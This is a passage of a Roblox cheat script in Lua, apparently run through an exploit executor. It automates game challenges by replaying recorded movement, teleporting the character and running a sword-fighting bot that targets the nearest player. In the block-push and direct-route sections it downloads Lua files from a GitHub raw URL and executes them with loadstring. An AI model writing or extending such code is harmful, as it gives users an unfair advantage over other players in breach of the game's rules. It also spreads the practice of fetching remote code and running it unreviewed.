    keypress(0xA0)
    task.wait()
    keyrelease(0xA0)
end

local function TAS_StopPlayback()
    if TAS_PlaybackConnection then
        TAS_PlaybackConnection:Disconnect()
        TAS_PlaybackConnection = nil
    end
    if TAS_FinishTouchConnection then
        TAS_FinishTouchConnection:Disconnect()
        TAS_FinishTouchConnection = nil
    end
    TAS_ViewingTAS = false
    if TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        TAS_LocalPlayer.Character.HumanoidRootPart.Anchored = false
    end
    if not TAS_DisableShiftlockAndCamera then
        task.spawn(TAS_ApplyShiftLock, false)
    end
end

local function TAS_PlayEmoteOrAnimation(Hum, name)
    if not Hum or not Hum.Parent then return end
    local Character = Hum.Parent
    local Animate = Character:FindFirstChild("Animate")
    if Animate then
        local PlayEmote = Animate:FindFirstChild("PlayEmote")
        if PlayEmote and PlayEmote:IsA("BindableFunction") then
            local ok = pcall(function() PlayEmote:Invoke(name) end)
            if ok then return end
        end
    end
    local Animator = Hum:FindFirstChildOfClass("Animator")
    if Animator then
        for _, track in ipairs(Animator:GetPlayingAnimationTracks()) do
            if track.Name == name then
                if not track.IsPlaying then track:Play() end
                track:AdjustSpeed(1)
                return
            end
        end
        local animObj = Character:FindFirstChild(name, true)
        if animObj and animObj:IsA("Animation") then
            local track = Animator:LoadAnimation(animObj)
            track.Name = name
            track:Play()
            track:AdjustSpeed(1)
            return
        end
        if Animate then
            local EmotesFolder = Animate:FindFirstChild("Emotes")
            if EmotesFolder then
                local EmoteEntry = EmotesFolder:FindFirstChild(name)
                if EmoteEntry then
                    local anim = EmoteEntry:FindFirstChildOfClass("Animation")
                    if anim then
                        local track = Animator:LoadAnimation(anim)
                        track.Name = name
                        track:Play()
                        track:AdjustSpeed(1)
                        return
                    end
                end
            end
        end
    end
    if Hum.PlayEmote then pcall(function() Hum:PlayEmote(name) end) end
    local ChatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    if ChatEvents then
        local SayEvent = ChatEvents:FindFirstChild("SayMessageRequest")
        if SayEvent then SayEvent:FireServer("/e " .. name, "All") end
    end
end

local function TAS_GetFramePosition(frame)
    return Vector3.new(frame.CCFrame[1], frame.CCFrame[2], frame.CCFrame[3])
end

local function TAS_ComputePathTime(path, fromPos)
    if path.Status ~= Enum.PathStatus.Success then return math.huge end
    local waypoints = path:GetWaypoints()
    if #waypoints == 0 then return math.huge end
    local length = 0
    local last = fromPos
    for _, wp in ipairs(waypoints) do
        length = length + (wp.Position - last).Magnitude
        last = wp.Position
    end
    return length / 16
end

local function TAS_FindBestSyncFrame(TAS, currentPos)
    if #TAS == 0 then return 1 end
    local maxFrame = math.min(120, #TAS)
    local bestEstIndex = 1
    local bestEstSaved = -math.huge
    local closestIndex = 1
    local closestDist = math.huge
    for i = 1, maxFrame do
        local frame = TAS[i]
        local pos = TAS_GetFramePosition(frame)
        local dist = (pos - currentPos).Magnitude
        local estTime = dist / 16
        local estSaved = frame.time - estTime
        if dist < closestDist then
            closestDist = dist
            closestIndex = i
        end
        if estSaved > bestEstSaved and frame.time >= estTime then
            bestEstSaved = estSaved
            bestEstIndex = i
        end
    end
    if bestEstSaved == -math.huge then return closestIndex end
    local searchStart = math.max(1, bestEstIndex - 10)
    local searchEnd = math.min(maxFrame, bestEstIndex + 10)
    local bestIndex = bestEstIndex
    local bestSaved = bestEstSaved
    for i = searchStart, searchEnd do
        local frame = TAS[i]
        local pos = TAS_GetFramePosition(frame)
        local path = TAS_PathfindingService:CreatePath({AgentRadius = 0.5, AgentHeight = 2, AgentCanJump = true})
        local ok = pcall(function() path:ComputeAsync(currentPos, pos) end)
        local pathTime
        if ok and path.Status == Enum.PathStatus.Success then
            pathTime = TAS_ComputePathTime(path, currentPos)
        else
            pathTime = (pos - currentPos).Magnitude / 16
        end
        local saved = frame.time - pathTime
        if saved > bestSaved and frame.time >= pathTime then
            bestSaved = saved
            bestIndex = i
        end
    end
    return bestIndex
end

local function TAS_ViewPlayback(TAS, startIndex)
    startIndex = startIndex or 1
    if TAS_ViewingTAS or #TAS == 0 then return end
    TAS_ViewingTAS = true
    local syncFrame = TAS[startIndex]
    local StartTime = tick() - syncFrame.time
    local CurrentFrameIndex = startIndex
    local Character = TAS_LocalPlayer.Character
    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        TAS_ViewingTAS = false
        return
    end
    local RootPart = Character.HumanoidRootPart
    local Hum = Character.Humanoid
    RootPart.Anchored = false
    local assets = TAS_Workspace:FindFirstChild("Assets")
    local finishPart = assets and assets:FindFirstChild("Finish", true)
    local mapFolder = finishPart and finishPart:FindFirstAncestorOfClass("Folder") or finishPart and finishPart:FindFirstAncestorOfClass("Model")
    if finishPart then
        TAS_FinishTouchConnection = finishPart.Touched:Connect(function(hit)
            if hit and hit.Parent == Character then
                TAS_StopPlayback()
                return
            end
            if mapFolder and not assets:FindFirstChild(mapFolder.Name) then
                TAS_StopPlayback()
            end
        end)
    end
    TAS_PlaybackConnection = TAS_RunService.Heartbeat:Connect(function()
        if not RootPart or not RootPart.Parent then
            TAS_StopPlayback()
            return
        end
        if not TAS_ViewingTAS then return end
        local ElapsedTime = tick() - StartTime
        local TargetFrame = nil
        while CurrentFrameIndex <= #TAS and TAS[CurrentFrameIndex].time <= ElapsedTime do
             TargetFrame = TAS[CurrentFrameIndex]
             CurrentFrameIndex = CurrentFrameIndex + 1
        end
        if TargetFrame then
             local cf = TargetFrame.CCFrame
             local cam = TargetFrame.CCameraCFrame
             RootPart.CFrame = CFrame.new(cf[1], cf[2], cf[3], cf[4], cf[5], cf[6], cf[7], cf[8], cf[9], cf[10], cf[11], cf[12])
             RootPart.Velocity = Vector3.new(TargetFrame.VVelocity[1], TargetFrame.VVelocity[2], TargetFrame.VVelocity[3])
             if not TAS_DisableShiftlockAndCamera then
                 TAS_Workspace.CurrentCamera.CFrame = CFrame.new(cam[1], cam[2], cam[3], cam[4], cam[5], cam[6], cam[7], cam[8], cam[9], cam[10], cam[11], cam[12])
             end
             local AnimInfo = TargetFrame.AAnimation
             if AnimInfo and Hum and Hum.Parent then
                 TAS_PlayEmoteOrAnimation(Hum, AnimInfo.Name)
             end
             if not TAS_DisableShiftlockAndCamera and TargetFrame.ShiftLock ~= nil then
                 task.spawn(TAS_ApplyShiftLock, TargetFrame.ShiftLock)
             end
        end
        if CurrentFrameIndex > #TAS then
            TAS_StopPlayback()
        end
    end)
end

local function TAS_ComputePathToSync(TAS, currentPos, forcePathfind)
    local syncIndex = 1
    if TAS_PathfindToStart or forcePathfind then
        syncIndex = TAS_FindBestSyncFrame(TAS, currentPos)
    end
    local syncPos = TAS_GetFramePosition(TAS[syncIndex])
    if (syncPos - currentPos).Magnitude < 5 then
        return syncIndex, nil, syncPos
    end
    local path = TAS_PathfindingService:CreatePath({AgentRadius = 1.5, AgentHeight = 4, AgentCanJump = true})
    local ok = pcall(function() path:ComputeAsync(currentPos, syncPos) end)
    if not ok or path.Status ~= Enum.PathStatus.Success then
        return syncIndex, nil, syncPos
    end
    return syncIndex, path, syncPos
end

local function TAS_ExecutePathAndPlay(TAS, syncIndex, path, syncPos)
    local Character = TAS_LocalPlayer.Character
    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        TAS_ViewPlayback(TAS, syncIndex)
        return
    end
    local RootPart = Character.HumanoidRootPart
    local Hum = Character.Humanoid
    if not Hum then
        RootPart.CFrame = CFrame.new(syncPos)
        TAS_ViewPlayback(TAS, syncIndex)
        return
    end
    RootPart.Anchored = false
    pcall(function()
        Hum.Sit = false
        Hum:ChangeState(Enum.HumanoidStateType.Running)
    end)
    if not path then
        RootPart.CFrame = CFrame.new(syncPos)
        TAS_ViewPlayback(TAS, syncIndex)
        return
    end
    TAS_ActivePathfindId = TAS_ActivePathfindId + 1
    local thisId = TAS_ActivePathfindId
    local waypoints = path:GetWaypoints()
    task.spawn(function()
        for i, waypoint in ipairs(waypoints) do
            if TAS_ActivePathfindId ~= thisId then return end
            if not Hum or not Hum.Parent then return end
            if waypoint.Action == Enum.PathWaypointAction.Jump then
                Hum.Jump = true
                if RootPart then
                    RootPart.Velocity = Vector3.new(RootPart.Velocity.X, math.max(RootPart.Velocity.Y, 40), RootPart.Velocity.Z)
                end
                task.wait(0.15)
            end
            Hum:MoveTo(waypoint.Position)
            local reached = false
            local con = Hum.MoveToFinished:Connect(function(ok) reached = ok end)
            local startWait = tick()
            while not reached and (tick() - startWait) < 6 do
                if TAS_ActivePathfindId ~= thisId then
                    con:Disconnect()
                    return
                end
                if waypoint.Action == Enum.PathWaypointAction.Jump and Hum and RootPart then
                    Hum.Jump = true
                end
                task.wait(0.05)
            end
            con:Disconnect()
            if not reached then
                if TAS_ActivePathfindId ~= thisId then return end
                RootPart.CFrame = CFrame.new(syncPos)
                break
            end
        end
        if TAS_ActivePathfindId ~= thisId then return end
        if RootPart and (syncPos - RootPart.Position).Magnitude > 10 then
            RootPart.CFrame = CFrame.new(syncPos)
        end
        TAS_ViewPlayback(TAS, syncIndex)
    end)
end

local function TAS_PathfindAndPlay(TAS)
    if #TAS == 0 then return end
    local Character = TAS_LocalPlayer.Character
    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        TAS_ViewPlayback(TAS, 1)
        return
    end
    local currentPos = Character.HumanoidRootPart.Position
    local syncIndex, path, syncPos = TAS_ComputePathToSync(TAS, currentPos, true)
    if not path then
        if (syncPos - currentPos).Magnitude < 5 then
            TAS_ViewPlayback(TAS, syncIndex)
        else
            Character.HumanoidRootPart.CFrame = CFrame.new(syncPos)
            TAS_ViewPlayback(TAS, syncIndex)
        end
        return
    end
    TAS_ExecutePathAndPlay(TAS, syncIndex, path, syncPos)
end

local function TAS_NormalizeName(name)
    if type(name) == "table" then name = name[1] or "" end
    if type(name) ~= "string" then name = tostring(name) end
    return name:gsub("[^%w]", ""):lower()
end

local function TAS_GetTeamSpawnPosition(teamFolder)
    if not teamFolder then return nil end
    local spawnLoc = teamFolder:FindFirstChildOfClass("SpawnLocation")
    if spawnLoc then return spawnLoc.Position end
    for _, child in ipairs(teamFolder:GetDescendants()) do
        if child:IsA("BasePart") then return child.Position end
    end
    return nil
end

local function TAS_ScoreMapToFile(normMap, normFile)
    if normFile == normMap then return 100 end
    if normFile:find(normMap, 1, true) or normMap:find(normFile, 1, true) then return 50 end
    local score = 0
    for i = 3, math.min(#normMap, 8) do
        local chunk = normMap:sub(1, i)
        if normFile:find(chunk, 1, true) then score = math.max(score, i) end
    end
    return score
end

local function TAS_GetMapTasFile()
    local assets = TAS_Workspace:FindFirstChild("Assets")
    if not assets then return nil end
    local allRoutes = {}
    for name, info in pairs(TAS_RouteSources) do
        table.insert(allRoutes, {name = name, info = info})
    end
    if isfolder and isfolder("TAS_Recorder") and listfiles then
        for _, path in ipairs(listfiles("TAS_Recorder")) do
            if path:match("%.json$") then
                local fileName = path:match("([^/\\]+)$") or path
                local baseName = fileName:gsub("%.json$", "")
                table.insert(allRoutes, {name = baseName, info = path})
            end
        end
    end
    if #allRoutes == 0 then return nil end
    local bestFolder = nil
    local bestFolderScore = 0
    local bestCandidate = nil
    for _, child in ipairs(assets:GetChildren()) do
        if child:IsA("Folder") or child:IsA("Model") then
            local normMap = TAS_NormalizeName(child.Name)
            local folderBestScore = 0
            local folderBestCandidate = nil
            for _, route in ipairs(allRoutes) do
                local normFile = TAS_NormalizeName(route.name)
                local score = TAS_ScoreMapToFile(normMap, normFile)
                if score > folderBestScore then
                    folderBestScore = score
                    folderBestCandidate = {path = route.info, name = route.name, norm = normFile, score = score, team = normFile:match("team(%d)")}
                end
            end
            if folderBestScore > bestFolderScore then
                bestFolderScore = folderBestScore
                bestFolder = child
                bestCandidate = folderBestCandidate
            end
        end
    end
    if not bestFolder or bestFolderScore < 5 then return nil end
    local mapName = bestFolder.Name
    if TAS_LastMapName ~= mapName then
        TAS_LastMapName = mapName
        TAS_LastMapDetectTime = tick()
        return nil
    end
    if tick() - TAS_LastMapDetectTime < 1 then return nil end
    local preferredTeam = nil
    local teamFolders = {}
    for _, child in ipairs(bestFolder:GetChildren()) do
        local teamNum = child.Name:match("^Team(%d+)$")
        if teamNum then table.insert(teamFolders, {folder = child, num = tonumber(teamNum)}) end
    end
    if #teamFolders > 1 then
        local char = TAS_LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local closestTeam = nil
            local closestDist = math.huge
            for _, info in ipairs(teamFolders) do
                local pos = TAS_GetTeamSpawnPosition(info.folder)
                if pos then
                    local dist = (pos - hrp.Position).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        closestTeam = info.num
                    end
                end
            end
            if closestTeam then preferredTeam = closestTeam end
        end
    end
    local mapPrefix = bestCandidate.norm:gsub("team%d+", "")
    local candidates = {}
    for _, route in ipairs(allRoutes) do
        local normFile = TAS_NormalizeName(route.name)
        local candPrefix = normFile:gsub("team%d+", "")
        if candPrefix == mapPrefix or normFile:sub(1, #mapPrefix) == mapPrefix then
            table.insert(candidates, {path = route.info, name = route.name, norm = normFile, team = normFile:match("team(%d)")})
        end
    end
    if preferredTeam then
        for _, cand in ipairs(candidates) do
            if cand.team and tonumber(cand.team) == preferredTeam then return cand.path end
        end
    end
    for _, cand in ipairs(candidates) do
        if cand.norm:find("team1") then return cand.path end
    end
    local mapNameLower = mapName:lower()
    if mapNameLower:find("cave") and mapNameLower:find("chaos") then
        for _, route in ipairs(allRoutes) do
            if route.name:lower() == TAS_SelectedCaveChaos:lower() then return route.info end
        end
        if listfiles then
            for _, path in ipairs(listfiles("TAS_Recorder")) do
                local fileName = path:match("([^/\\]+)$") or path
                local baseName = fileName:gsub("%.json$", "")
                if baseName:lower() == TAS_SelectedCaveChaos:lower() then return path end
            end
        end
    elseif mapNameLower:find("unstable") and mapNameLower:find("savannah") then
        for _, route in ipairs(allRoutes) do
            if route.name:lower() == TAS_SelectedUnstableSavannah:lower() then return route.info end
        end
        if listfiles then
            for _, path in ipairs(listfiles("TAS_Recorder")) do
                local fileName = path:match("([^/\\]+)$") or path
                local baseName = fileName:gsub("%.json$", "")
                if baseName:lower() == TAS_SelectedUnstableSavannah:lower() then return path end
            end
        end
    elseif mapNameLower:find("construct") and mapNameLower:find("course") then
        for _, route in ipairs(allRoutes) do
            if route.name:lower() == TAS_SelectedConstructCourse:lower() then return route.info end
        end
        if listfiles then
            for _, path in ipairs(listfiles("TAS_Recorder")) do
                local fileName = path:match("([^/\\]+)$") or path
                local baseName = fileName:gsub("%.json$", "")
                if baseName:lower() == TAS_SelectedConstructCourse:lower() then return path end
            end
        end
    elseif mapNameLower:find("colosseum") and mapNameLower:find("climb") then
        for _, route in ipairs(allRoutes) do
            if route.name:lower() == TAS_SelectedColosseumClimb:lower() then return route.info end
        end
        if listfiles then
            for _, path in ipairs(listfiles("TAS_Recorder")) do
                local fileName = path:match("([^/\\]+)$") or path
                local baseName = fileName:gsub("%.json$", "")
                if baseName:lower() == TAS_SelectedColosseumClimb:lower() then return path end
            end
        end
    end
    return bestCandidate.path
end

local function TAS_IsInChallenge()
    local challengePlayers = TAS_Workspace:FindFirstChild("ChallengePlayers")
    if not challengePlayers then return false end
    return challengePlayers:FindFirstChild(TAS_LocalPlayer.Name) ~= nil
end

local function TAS_RunAutoPlayWithPathfind()
    if not TAS_IsInChallenge() then return end
    local file = TAS_GetMapTasFile()
    if not file then
        for i = 1, 10 do
            task.wait(0.2)
            if not TAS_IsInChallenge() then return end
            file = TAS_GetMapTasFile()
            if file then break end
        end
    end
    if not file then return end
    if type(file) == "table" and file.type == "direct" then
        local Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if not (Hum and Hum.WalkSpeed >= 16) then
            while true do
                if not TAS_IsInChallenge() then return end
                Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if Hum and Hum.WalkSpeed >= 16 then break end
                task.wait(0.05)
            end
        end
        local content = TAS_RouteCacheDirect[file.source]
        if not content then
            local ok
            ok, content = pcall(function() return game:HttpGet(file.source, true) end)
            if not ok then content = nil end
        end
        if content then
            local fnOk, fn = pcall(loadstring, content)
            if fnOk and type(fn) == "function" then task.spawn(fn) end
        end
        return
    end
    local data = TAS_LoadFromSource(file)
    if not data then return end
    TAS_ActivePathfindId = TAS_ActivePathfindId + 1
    TAS_StopPlayback()
    local Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if Hum and Hum.WalkSpeed == 0 then
        local Character = TAS_LocalPlayer.Character
        if Character and Character:FindFirstChild("HumanoidRootPart") then
            local currentPos = Character.HumanoidRootPart.Position
            local syncIndex, path, syncPos = TAS_ComputePathToSync(data, currentPos, true)
            if not (Hum and Hum.WalkSpeed >= 16) then
                while true do
                    if not TAS_IsInChallenge() then return end
                    Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if Hum and Hum.WalkSpeed >= 16 then break end
                    task.wait(0.05)
                end
            end
            if not Character or not Character:FindFirstChild("HumanoidRootPart") then
                TAS_ViewPlayback(data, syncIndex)
                return
            end
            TAS_ExecutePathAndPlay(data, syncIndex, path, syncPos)
        else
            if not (Hum and Hum.WalkSpeed >= 16) then
                while true do
                    if not TAS_IsInChallenge() then return end
                    Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if Hum and Hum.WalkSpeed >= 16 then break end
                    task.wait(0.05)
                end
            end
            TAS_PathfindAndPlay(data)
        end
    else
        if not (Hum and Hum.WalkSpeed >= 16) then
            while true do
                if not TAS_IsInChallenge() then return end
                Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if Hum and Hum.WalkSpeed >= 16 then break end
                task.wait(0.05)
            end
        end
        TAS_PathfindAndPlay(data)
    end
end

AutoplayTab:CreateSection("Autoplay")
AutoplayTab:CreateLabel("Note: Keep shiftlock off and don't move your camera before the round starts.", "info")
AutoplayTab:CreateLabel("Note: You may experience lag when toggling autoplays on.", "info")

if not isMovies then
    local _pt_enabled = false
    local _pt_placements = {}
    local _pt_finished = {}
    local _pt_myTeam = nil
    local _pt_conns = {}

    local function _pt_ordinal(n)
        if n == 1 then return "1st"
        elseif n == 2 then return "2nd"
        elseif n == 3 then return "3rd"
        else return n .. "th" end
    end

    local function _pt_getGameName(p)
        local ok, name = pcall(function()
            local RS = game:GetService("ReplicatedStorage")
            local season = RS:FindFirstChild("Season")
            if not season then return p.Name end
            local playersFolder = season:FindFirstChild("Players")
            if not playersFolder then return p.Name end
            local data = playersFolder:FindFirstChild(p.Name)
            if data and data.Value and data.Value ~= "" then
                return data.Value
            end
            return p.Name
        end)
        return (ok and name) or p.Name
    end

    local function _pt_printLeaderboard()
        print("===== CHALLENGE PLACEMENTS =====")
        for i, entry in ipairs(_pt_placements) do
            local tag = (entry.robloxName == player.Name) and " << YOU" or ""
            print(string.format("  #%d - %s (%s)%s", i, entry.gameName, entry.robloxName, tag))
        end
        print("---")
    end

    local function _pt_sendChat(msg)
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
        end)
    end

    local function _pt_onFinish(p)
        local playerName = p.Name
        if _pt_finished[playerName] then return end
        _pt_finished[playerName] = true
        local rank = #_pt_placements + 1
        local gameName = _pt_getGameName(p)
        table.insert(_pt_placements, { robloxName = playerName, gameName = gameName })
        print(string.format("[Placement Tracker] %s (%s) finished in %s place!", gameName, playerName, _pt_ordinal(rank)))
        if playerName == player.Name then
            _pt_sendChat(_pt_ordinal(rank))
            _pt_printLeaderboard()
        end
    end

    local function _pt_watchPad(pad)
        local conn = pad.Touched:Connect(function(hit)
            if not _pt_myTeam then return end
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                if p.Team and p.Team == _pt_myTeam then
                    local char = p.Character
                    if char and hit:IsDescendantOf(char) then
                        _pt_onFinish(p)
                    end
                end
            end
        end)
        table.insert(_pt_conns, conn)
    end

    local function _pt_start()
        if player.Team then
            _pt_myTeam = player.Team
            print("[Placement Tracker] Team: " .. _pt_myTeam.Name)
        end
        local teamConn = player:GetPropertyChangedSignal("Team"):Connect(function()
            if not _pt_enabled then return end
            local newTeam = player.Team
            if _pt_myTeam and newTeam and newTeam ~= _pt_myTeam then
                print("[Placement Tracker] Team merged/changed, stopping tracker.")
                Rayfield:Notify({ Title = "Placement Tracker", Content = "Teams merged, tracker stopped.", Duration = 4, Image = "trophy" })
                _pt_enabled = false
                pcall(function()
                    if Rayfield.Flags and Rayfield.Flags.PlacementTracker then
                        Rayfield.Flags.PlacementTracker:Set(false)
                    end
                end)
                _pt_stop()
            elseif newTeam and not _pt_myTeam then
                _pt_myTeam = newTeam
                print("[Placement Tracker] Team set: " .. _pt_myTeam.Name)
            end
        end)
        table.insert(_pt_conns, teamConn)

        local found = 0
        for _, v in ipairs(workspace:GetDescendants()) do
            if v.Name == "Finish" and v:IsA("BasePart") then
                _pt_watchPad(v)
                found += 1
            end
        end
        print("[Placement Tracker] Watching " .. found .. " Finish part(s).")

        local addConn = workspace.DescendantAdded:Connect(function(v)
            if _pt_enabled and v.Name == "Finish" and v:IsA("BasePart") then
                _pt_watchPad(v)
                print("[Placement Tracker] Late Finish part: " .. v:GetFullName())
            end
        end)
        table.insert(_pt_conns, addConn)
    end

    local function _pt_stop()
        for _, c in ipairs(_pt_conns) do c:Disconnect() end
        _pt_conns = {}
        _pt_placements = {}
        _pt_finished = {}
        _pt_myTeam = nil
        print("[Placement Tracker] Stopped.")
    end

    AutoplayTab:CreateToggle({
        Name = "Auto Say Placement & Placement Tracker (check console)",
        CurrentValue = false,
        Flag = "PlacementTracker",
        Callback = function(Value)
            _pt_enabled = Value
            if Value then
                _pt_placements = {}
                _pt_finished = {}
                _pt_start()
                Rayfield:Notify({ Title = "Placement Tracker", Content = "Tracking your team's placements. Your finish will be said in chat!", Duration = 4, Image = "trophy" })
            else
                _pt_stop()
            end
        end,
    })
end

if isCamp then
    AutoplayTab:CreateToggle({
        Name = "Autoplay",
        CurrentValue = false,
        Callback = function(Value)
            TAS_AutoplayEnabled = Value
            if Value then
                task.spawn(TAS_PrefetchAllRoutes)
                task.spawn(function()
                    while TAS_AutoplayEnabled do
                        if TAS_IsInChallenge() then
                            local Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                            if Hum and Hum.WalkSpeed == 0 then
                                TAS_RunAutoPlayWithPathfind()
                            end
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end
    })

    -- auto blockpush (probs broke asf)
    local _bp_BASE_URL = "https://raw.githubusercontent.com/opsecophelia/ckblock/main/"
    local _bp_PLAY_FILES = {
        "blockpush_1_boat_side.lua",
        "blockpush_2_boat_side.lua",
        "blockpush_3_boat_side.lua",
        "blockpush_4_boat_side.lua",
        "blockpush_1_kitchen.lua",
        "blockpush_2_kitchen.lua",
        "blockpush_3_kitchen.lua",
        "blockpush_4_kitchen.lua",
        "blockpush_BACK.lua",
    }
    local _bp_autoEnabled = false
    local _bp_cachedPlays = {}
    local _bp_fetchDone = false
    local _bp_fetchCount = 0

    local function _bp_isBlockPush()
        return workspace:FindFirstChild("SingularBox", true) ~= nil
    end

    local function _bp_extractStartPos(src)
        local x, y, z = src:match("local d={{CFrame%.new%(([%d%.%-e]+),%s*([%d%.%-e]+),%s*([%d%.%-e]+)")
        if x and y and z then
            return Vector3.new(tonumber(x), tonumber(y), tonumber(z))
        end
        return nil
    end

    local function _bp_fetchAllPlays()
        _bp_cachedPlays = {}
        _bp_fetchDone = false
        _bp_fetchCount = 0
        for _, fileName in ipairs(_bp_PLAY_FILES) do
            task.spawn(function()
                local url = _bp_BASE_URL .. fileName
                local ok, src = pcall(function() return game:HttpGet(url) end)
                if ok and src and #src > 100 then
                    local startPos = _bp_extractStartPos(src)
                    if startPos then
                        table.insert(_bp_cachedPlays, { src = src, startPos = startPos, name = fileName })
                    end
                end
                _bp_fetchCount = _bp_fetchCount + 1
                if _bp_fetchCount >= #_bp_PLAY_FILES then
                    _bp_fetchDone = true
                end
            end)
        end
    end

    local function _bp_pickClosestPlay()
        local char = TAS_LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end
        local bestPlay, bestDist = nil, math.huge
        for _, play in ipairs(_bp_cachedPlays) do
            local dist = (play.startPos - hrp.Position).Magnitude
            if dist < bestDist then bestDist = dist; bestPlay = play end
        end
        return bestPlay
    end

    AutoplayTab:CreateToggle({
        Name = "Block Push Autoplay",
        CurrentValue = false,
        Callback = function(Value)
            _bp_autoEnabled = Value
            if not Value then return end
            task.spawn(_bp_fetchAllPlays)
            task.spawn(function()
                while _bp_autoEnabled do
                    if not TAS_IsInChallenge() or not _bp_isBlockPush() then
                        task.wait(0.5)
                    else
                        if not _bp_fetchDone then
                            while _bp_autoEnabled and not _bp_fetchDone do task.wait(0.1) end
                        end
                        if not _bp_autoEnabled then break end
                        local hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                        if hum and hum.WalkSpeed > 0 then
                            task.wait(0.1)
                        else
                            local chosenPlay = _bp_pickClosestPlay()
                            if not chosenPlay then
                                task.wait(1)
                            else
                                while _bp_autoEnabled and TAS_IsInChallenge() and _bp_isBlockPush() do
                                    hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                                    if hum and hum.WalkSpeed >= 16 then break end
                                    task.wait(0.05)
                                end
                                if not _bp_autoEnabled then break end
                                if TAS_IsInChallenge() and _bp_isBlockPush() then
                                    local char = TAS_LocalPlayer.Character
                                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                                    if hrp then hrp.CFrame = CFrame.new(chosenPlay.startPos); task.wait(0.1) end
                                    local fn, err = loadstring(chosenPlay.src)
                                    if fn then task.spawn(fn) end
                                    while _bp_autoEnabled and TAS_IsInChallenge() and _bp_isBlockPush() do task.wait(0.5) end
                                end
                            end
                        end
                    end
                end
            end)
        end
    })

    AutoplayTab:CreateDropdown({
        Name = "Cave Chaos",
        Options = {"Cave Chaos", "Cave Chaos Clip"},
        CurrentOption = "Cave Chaos",
        Callback = function(Option)
            local selected = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            TAS_SelectedCaveChaos = tostring(selected or "Cave Chaos")
        end
    })
    
    AutoplayTab:CreateDropdown({
        Name = "Unstable Savannah",
        Options = {"Unstable Savannah", "Unstable Savannah Clip"},
        CurrentOption = "Unstable Savannah",
        Callback = function(Option)
            if type(Option) == "table" then
                TAS_SelectedUnstableSavannah = Option[1] or Option.Option or "Unstable Savannah"
            else
                TAS_SelectedUnstableSavannah = Option
            end
        end
    })
    
    AutoplayTab:CreateDropdown({
        Name = "Construct Course",
        Options = {"Construct Course", "Construct Course Wallhop"},
        CurrentOption = "Construct Course",
        Callback = function(Option)
            local selected = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            TAS_SelectedConstructCourse = tostring(selected or "Construct Course")
        end
    })
    
    AutoplayTab:CreateDropdown({
        Name = "Colosseum Climb",
        Options = {"Colosseum Climb", "Colosseum Climb Wallhop"},
        CurrentOption = "Colosseum Climb",
        Callback = function(Option)
            local selected = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            TAS_SelectedColosseumClimb = tostring(selected or "Colosseum Climb")
        end
    })
    
    
    AutoplayTab:CreateDivider()
    local _sfBot_Camp_enabled = false
    AutoplayTab:CreateToggle({
        Name = "Sword Fight Autoplay",
        CurrentValue = false,
        Flag = "SwordFightAutoplayCamp",
        Callback = function(Value)
            _sfBot_Camp_enabled = Value
            if Value then
                task.spawn(function()
                    local _lp3w = game.Players.LocalPlayer
                    local _hasSword3w = false
                    repeat
                        task.wait(0.5)
                        _hasSword3w = false
                        local _chr3w = _lp3w.Character
                        if _chr3w then
                            for _, item in pairs(_chr3w:GetChildren()) do
                                if item:IsA("Tool") and item.Name:lower():find("sword") then _hasSword3w = true; break end
                            end
                        end
                        if not _hasSword3w then
                            local _bp3w = _lp3w:FindFirstChild("Backpack")
                            if _bp3w then
                                for _, item in pairs(_bp3w:GetChildren()) do
                                    if item:IsA("Tool") and item.Name:lower():find("sword") then _hasSword3w = true; break end
                                end
                            end
                        end
                    until _hasSword3w or not _sfBot_Camp_enabled
                    
                    if not _sfBot_Camp_enabled then return end
                    local _player = game.Players.LocalPlayer
                    local _stupid = _player.Character or _player.CharacterAdded:Wait()
                    local _human = _stupid:WaitForChild("Humanoid")
                    local _root = _stupid:WaitForChild("HumanoidRootPart")
                    local _cachedTarget = nil
                    local _lastMove3 = 0
                    local _lastActivate3 = 0
                    local _number3 = math.random(20, 90)
                    
                    task.spawn(function()
                        while _sfBot_Camp_enabled do
                            task.wait(math.random(1, 5) / 100)
                            _number3 = math.random(20, 90)
                        end
                    end)
                    
                    task.spawn(function()
                        while _sfBot_Camp_enabled do
                            task.wait(0.5)
                            local t3 = nil
                            local vhd3 = math.huge
                            for _, v in pairs(workspace:GetDescendants()) do
                                if v:IsA("Model") and v ~= _stupid then
                                    local h3 = v:FindFirstChildOfClass("Humanoid")
                                    local r3 = v:FindFirstChild("HumanoidRootPart")
                                    if h3 and r3 and h3.Health > 0 then
                                        local d3 = (_root.Position - r3.Position).Magnitude
                                        if d3 < vhd3 then vhd3 = d3; t3 = v end
                                    end
                                end
                            end
                            _cachedTarget = t3
                        end
                    end)
                    
                    local _bg3 = Instance.new("BodyGyro")
                    _bg3.MaxTorque = Vector3.new(40000000, 40000000, 40000000)
